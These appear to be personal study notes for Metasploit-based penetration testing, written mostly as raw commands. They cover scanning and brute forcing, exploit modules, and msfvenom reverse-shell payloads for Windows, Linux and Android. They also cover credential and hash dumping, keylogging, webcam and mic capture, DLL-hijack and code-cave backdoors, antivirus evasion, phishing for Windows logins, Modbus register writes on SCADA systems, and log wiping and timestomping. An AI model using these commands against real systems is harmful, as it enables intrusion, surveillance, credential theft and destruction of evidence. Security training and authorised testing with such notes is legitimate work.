msf5 > use auxiliary/scanner/po
version
save 
spool
show 
info
makerc
getg,setg (g for global veriable)
msfupdate
info gathering
msf5 > use auxiliary/scanner/portscan/tcp
msf5 > use auxiliary/scanner/discovery/udp_sweep 
msf5 auxiliary(scanner/ftp/ftp_login) > use auxiliary/scanner/ftp/ftp_login 
msf5 auxiliary(scanner/ftp/ftp_login) > use auxiliary/scanner/ftp/ftp_version 
auxiliary/scanner/ftp/anonymous
auxiliary/scanner/smb/smb_version,
auxilary/scannner/smb/smb_enumuser
auxilary/scanner/smb/smb_enumshares
auxilary/scanner/http/http_version
auxiliary/scanner/http/backup_file
auxiliary/scanner/http/dir_listing
auxiliary/scanner/http/ss1
auxiliary/scanner/http/http_header
auxiliary/scanner/http/robot_txt
auxiliary/scanner/smtp/smtp_enum
auxiliary/scanner/ssh_enumusers
auxiliary/scanner/ssh_login
auxiliary/scanner/ssh_version
auxillary/scanner/ssh
auxiliary/scanner/detect/detect_kippo
auxiliary/scanner/gather/dns_info
auxiliary/scanner/rdp/ms12_020
auxiliary/sniffer/psnuffle
auxiliary/gather/shodan_search
----------------------------------------
database
----------------------------------------
service postgresl start
msfdb init
db_status
workspace -h ( list all switches)
workspace -a (new workplace)
works[ace -d (delete spcifed workplace)
workspace (switch context)
db_import(import scan from xml file nmao nesus)
db_export
-----------------------------------------------------
nmap 
-sT perform tcp connect scan
-sU scan open udp port
-sP ping scan
-A perform aggresive scan include steath syn scan os detection and version plus tracout an script)
-sV service version detecion  
-v print verbos output
-p 1-100 scan port 1 - 1000
-o perform os detection
-il scan all host from the file
-oX output scan rsult in XML format
-oG output scan result in greppable format
-- script execute specific script
<script_name> against the target
example: nmap -sT -sV -o 192.168.44.129 -oX/root/Desktop/scan.xml
db_nmap
--------------------------------------------------------------------------
nesus
-----------------------------------------------------------------
make sure that you start the Nessus daemon using the /etc/init.d/nessusd start command.
nesus_policy_list
nesus_scan_new
nessus_scan_launch
nesus_report_vulns
autpawn (depericiated but have to download manually)
wget https://raw.githubusercontent.com
/jeffbryner/kinectasploit/master/db_autopwn.rb

msf use db_autopwn
db_autopwn -p -t (list matched exploit using the following command)
db_autopwn -p -t -e (exploit matched  exploit )
msfvenom
msfvenom --list
msfvenom (list encoder)
msfvenom --help
msfvenom --help-platforms
stoolkit file storage place(/root/.set/)

---------------------------------------------------------------------------
wmap
load wmap
wmap_sites -a 192.168.111. (workspace)
wmap_run -t full url (check which module is applicatibale against our target 
wmap_target -l
wmap_run -e
wmap_vulns -l (check in databse)
web enumeration
auxillary/scanner/http/cert
auxillary/scanner/http/dir_scanner
auxiliary/scanner/http/enum_wayback
auxiliary/scanner/http/files_dir
auxillary/scanner/http/http_login
auxiliary/scanner/http/options
auxiliary/scanner/http/http_version


---------------------------------------------------------------------------
reload_all (relaod all the modules and refersh metasploit)
db_rebuild_cache

---------------------------------------------------------------------------
use post/multi/recon/local_exploit_suggester (lcheck various kinds of local privilege escalation exploits and will suggest the best one to)
meterpreter>arp
laoadpath (to load module in exploit)
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.111.169 lport=4443 elf -b 'x00' > reverse_connect.elf
use post/linux/gather/enum_config
use post/linux/gather/enum_system
arp
use post/multi/manage/autoroute
set session 3
set subnet 192.168.111.0
run port scan on target
use auxillary/scanner/portscan/tcp
check and set all options
use auxiliary/server/sock4a
now config proxy chain
vi /etc/proxychains.conf
add
blelow [proxylist]
socks4 127.0.0.1 1080
now set browse same manual socks v4
-----------------------------------------------------
run the module
use exploit/windows/http_disk_pluse
use /post/windows/gather/enum_application
show options
run
post windows/gather/credentiaol/winscp
run
use auxillary/scanner/ssh/ssh_login
run
proxychains scp bind.elf root@192.168.116.134:/home/nipun/flock.elf
loadpath

Run metsvc -A (persistance script for backdoor)
use exploit/multi/handler
set payload winodows/meterpreter/mstsvc_bind_tcp
---------------------------------------------------------------------------
railgun
irb
clinet.railgun.DLLname.function(parameters)
railgun.user32.LockWorkStation()
railgun.netapi32.NetUserDel(arg1,arg2)
railgun.netapi32.NetuserDel(nil,"Sami")
Refer to the following path to find out more about RailGun-supported DLL files: /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def.
#using pattern offset tool
cd/usr/share/metasploit-framework/tools/exploit ./pattern_offset.rb 72413372 1000 (O offset 520)
msfpescan(we can use this tool to find JMP instruction from DDL. note need to download manually)
./msfpescan
./msfpescan -j esp -f /root/Desktop/ws2_32.dll

---------------------------------------------------------------------------
The Mona script
---------------------------------------------------------------------------
nasm > jmp short 12
( O:  00000000  EB0A              jmp short 0xc)
msfrop -v -s "pop ecx" msvcrt.dll
---------------------------------------------------------------------------
use auxiliary/gather/shodan_search
set shodan_apikey krxdadssdada
set Query rockwell
use exploit/windows/scada/realwin_scp_initalize
post/multi/manage/autoroute
set subnet 192.168.111.116.0
extensive port scan is required bad practise
db_nmap -n -sT --scan-delay 1 -p1-1000 192.168.116.131 (-n switch to disable DNS resolution. The -sT switch denotes a TCP connect scan with a scan delay of 1 second)
------------------------------------------------------------------------------------------------------------------------------------------------------
use auxiliary/scanner/scada/modbusclient
set rhost
set data_address 4
run
set action write_register
set data 89
run
set action read_register
run
set action read_coils
run
Scanning MSSQL with Metasploit modules
 By default, MSSQL runs on TCP port number 1433 and the UDP service runs on port 1434. 
use auxiliary/scanner/mssql/mssql_ping
set rhost
bruteforcing password
use auxiliary/scanner/mssql/mssql_login
run
set user_file user.txt
set pass_file pass.txt
locating / capturing server password
use auxiliary/scanner/msql/mysql_hashdump
browsing sql server
use auxiliary/admin/mssql.msql_enum
set username sami
set passwod pass
run
post exploiting using system command
use auxiliary/admin/msql/msql_exec
set cmd ifconfig
run
running sql based queries
use auxiliary/admin/mssql/msql_sql
run
fingerprinting voip services
use auxilary/scanner/sip/option
scannning voip services
use auxiliary/scanner/sip/enumerator
set minnext 3000
set maxext 3005
set palden 4
set rhost 
run
spoofing voip call
use auxiliary/voip/sip_invite_spoof
set rhost
set extension 4444
run
exploiting voip
use exploit/windows/sip/sipxphone_cseq
set rhost
set payload windows/meterpretr/bind_tcp
set lhost
exploit
............
openvas
....
load openvas
opnevas_connect admin admin localhost 9390 ok
workspace - a AD_test
create target 
(name hosts comment)
opnevas_target_create 196_system 192.168.8.196 196_system_in_AD
openvas_config_list
openvas_task_create
openvas_task_start 6689798987987(id)
openvas_task_list
opnevas_report_download cbbbbbb  /root/196.xml 196
openvas_report_list
openvas_format_list
db_import /root/196.xml/196
opnevas_format_list
smf> vulns
modeling threat
search cve:2014-6287
use exploit/windows/http/rejetto_hfs_exec
exploit
meterpreter>
sysinfo
arp
exploiting AD
.........
use post/windows/gather/enum_domain (find domain controller)
run
use post/windows/gather/enum_shares (enum shares in ad network)
use post/windows/gather/enum_ad_computer(enum AD computers)
show options
set session 1
run
#enumerating sigined user in AD
use post/windows/gather/enum_logged_on_user
run
#enumerating tokens
use post/windows/gather/enum_domain_tokens
run
#using extapi in meterpeter
load extapi
#enumerating opne windows
windows_enum
#manipulating clipboard
clipboard_monitor_start
clipboard_monitor_dump
using ADSI management command in metasploit
adsi_computer_enum pyssg.com
adsi_dc_enum pyssg.com
adsi_user_enum pyssg.com
use exploit/windows/smb/psexec
set SMBDomain pyssg.com
set smbpass charlie@1337
set smbuser administrator
set rhost
run
meterpretr
sysinfo
getuid
.........
kiwi
...........
load kiwi
lss_dump_secrets
#lets migrate to lsass.exe
hashdump
...........
using cachedump in metasploit
............
use post/windows/gather/cachedump
set session 5
run
.............
maintain acess to AD
.............
use psot/windows/manage/add_user_domain
show option
run
#harvested details
loot
...................
browser autopwn attack
.......................
use auxiliary/server/browser_autopwn
show option
set lhost 
set uripath /
set srvport 80
.........................................................................
#pdf exploit nitro 11.0.3.173
use exploit windows/fileformat/nitro_reader_jsapi
show option
run
#microsoft word 2013
use exploit/windows/fileformat/office_word_hta
set filname msf.doc
set srvhost 
send gengerated file cp /root/.msf/local/report.doc /var/html/
#attacking android with metasploit
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.10.107 lport=4444 R> /var/www/html/pay2.apk
use exploit/multi/handler
set payload/meterpreter/reverse_tcp
set lhost
set lport
exploit
meterpreter>
check_root
send_sms -d 9611888888 -t "hello"
#you can send sms to any number 
sysinfo
#geolocate
wlan_geolocate
webcam_snap
.........................................................................
#metasploit extended
background
session -i 1
#meterpreter
#reading from channel
channel -l
channel -r [channel id]
pwd
cd c:\\
mkdir metasploit
cd metasploit
upload /root/desktop/test.txt c:\\
edit c:\\test.txt
cat c:\\test.txt
ls c:\
rm test.txt
download creditcard.txt
#desktop commadn 
enumdesktops
getdesktop
screenshot
webcam_list
webcam_stream
webcam_snap
record_mic
idletime
keyscan_start
getuid
timestomp -v creditcard
timestomp -z "11/26/1999 15:15:25" credtcard.txt
#blanck all 
timestomp -b creditcard.txt
#gathering wirless ssid with metsaploit
run post/windows/wlna/wlan_bss_list
#gathering wifi password
run post/windows/wlan/wlan_profile
#name <name>  password <keymaterial>
#getting application list 
run get_application_list
run post/windows/gather/credential/skype
run post/windows/gather/usb_history
search -f *.doc
#wiping logs
clearev
run event_manager -i
#pushm and popm
#Speeding up development using the reload, edit, and reload_all commands
reload
edit
reload_all
#Making use of resource scripts
makerc multi_hand
resource multi_hand
#Using AutoRunScript in Metasploit
#ex1
run post/windows/gather/chechvm
run post/winodws/migrate
#save filename: multi_script
#ex2 script 2
use explit/windows/http/rejetto_hfs_exec
set payload windows/meterpreter/reverse_tcp
set rhost
set rport
se lhost
set lpor
set Auorunscript multi_console_commadn -rc /root/my_script/multi_script
exploit
#save filename resource_complete
msf>resource /root/my_script/resource_complete

..................................................................................
#Using the multiscript module in AutoRunScript option
check vm
migrate -n explorer.exe
get env
event_manager -i
#save filename: multi_scr.rc
...................................................................................
#upafte path in resource_complete
use explit/windows/http/rejetto_hfs_exec
set payload windows/meterpreter/reverse_tcp
set rhost
set rport
se lhost
set lpor
set Auorunscript multiscript -rc /root/my_script/multi_scr.rc
exploit
........................................................................................
#Privilege escalation using Metasploit
meterpeter
hashdump
getuid
use exploit sm10_015_kitrap0d
show option
set session 3
exploit
getuid
hashdump
#Finding passwords in clear text using mimikatz
kerberos
#Sniffing traffic with Metasploit
sniffer_interfaces
sniffer_start 2 1000
# Host file injection with Metasploit
use post/windows/manage/inject_host
show option
set domain www.yahoo.com
set ip 192.168.111.112
set sesion 1
exploit
.........................................................................
# Phishing Windows login passwords
run post/windows/gather/phish_windows_credentials
#Evading Meterpreter using C wrappers and custom encoders
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.15.121 lport=4444 -f exe -b '\x00\x0a\x0d' > sample.exe
#CLACULATE md5 hash
md5sum /root/sample.exe
# wrirte in c
#Evading Meterpreter using C wrappers and custom encoders
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.15.121 lport=4444 -f c -b '\x00\x0a\x0d' > sample.c
#Bypassing Windows firewall blocked ports
#config ip tbale in kalinux for NAT
iptables -A PREROUTING -t nat -p tcp --dport 4444:7777 -j REDIRECT --to-port 4444
#payload reverse_tcp_allports
use payload windows/meterpreter/revers_tcp_allports
#msfvenom 
msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.15.121 lport=4444 -f exe -b '\x00\x0a\x0d' > sample.exe
#Maintaining anonymity in Meterpreter sessions
msfvenom -p windows/meterpreter/reverse_https_proxy HttpProxyHost=192.168.15.23 HttpProxyPort=808 LHOST=192.168.15.21 LPORT=8443 -f exe > band4.exe
# Maintaining access using vulnerabilities in common software
# DLL search order hijacking
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.15.121 LPORT=8443 -f dll> CRYPTBASE.dll
pwd
use post/windows/gather/enum_applications
set session 2
run
cd 'c:\Program files\VieoLAN\vlc'
pwd
upload CRYPTBASE.dll
use exploit/multi/handler
set payload windows/meterpeter/reverse_tcp
set lhost 192.168.15.21
set lport 8443
exploit -j
# if we open  vlc we get shell
shell
c:\Program files\VieoLAN\vlc>dir
c:\Program files\VieoLAN\vlc>vlc.exe
#Using code caves for hiding backdoors
backdoor -factory -f /roort/Desktop/test-dll/cryptbas.dll -s iat rverse_tc_inline -H 192.168.10.108 -P 8443 /mnt/hgfs/Share/cryptbase_new.dll -Z
#select any one cave we select 3
3
#Harvesting files from target systems
use post/windows/gather/enum_files
set FILE_GLOBS *.docs OR *.pdf OR *.xlxs
set session 5
run
#Using venom for obfuscation
venom
enter
2
#select agent 6 (c + windows)
6
#enter host[]
#enter payload name[]
#replace_icon[]
windows-store
# Covering tracks with anti-forensics modules
use post/windows/manage/cleantracks
shwo options
set cleaner
set del_logs true
set get_sys true
run
#armitage
armitage
yes
#Red teaming with Armitage team server
teamserver 192.168.15.21 hacker
#armitage connection
host:
port
user
pass
nicknam:
# Scripting Armitage
# load cortana script
logon 8081.cna
#Tips and Tricks
#Automation using Minion script
#copy minion to ~/.msf4/plugins
db_nmap -sT -sV 192.168.10.108
msf>mysql_enum
#We never had to load the module, fill in any options, or launch the module because the minion plugin has automated it for us. We can see that we have the MySQL version of the target host.
mysql_attack
#Amazing! Minion plugin automated the brute force attack for us,
#Using connect as Netcat
connect -C 192.168.10.108 1524
#Shell upgrades and background sessions
exploit -z
session -u 2
#Naming conventions
session -l
session -i 2 -n "shell on metasploit"
#Changing the prompt and making use of database variables
set prompt MsfGuy
workspace - a AcmeScan
workspace Ace
SET PROMPT MsfGuy:%W
set prompt %D %H %J %L %S %T %U %W
/root kali 0 192.168.10.105 3 17:56:53 root  AcmeScan>
%D to display the current local working directory, %H for the hostname, %J for the number of jobs currently running, %L for the local IP address (Quite Handy), %S for the number of sessions we have, %T for the timestamp, %U for the username, and %W for the workspace.
#Saving configurations in Metasploit
Msfguy>workspace AcemeScan
MsfGuy>set Prompt Msfguy:%W
MsfGuy:AcmeScan>save
MsfGuy:AcmeScan>exit
#Using inline handler and renaming jobs
MsfGuy:AcmeScan>handler -p windows/meterpreter/reverse_tcp -H 192.168.10.105 -P 4444
MsfGuy:AcmeScan>rename_job 0 "BackGround Handler 4444"
#Running commands on multiple Meterpreters
session -C getuid
# Automating the Social Engineering Toolkit
./seautomate se-script	
#file se-script
1
4
2
192.168.10.103
4444
yes























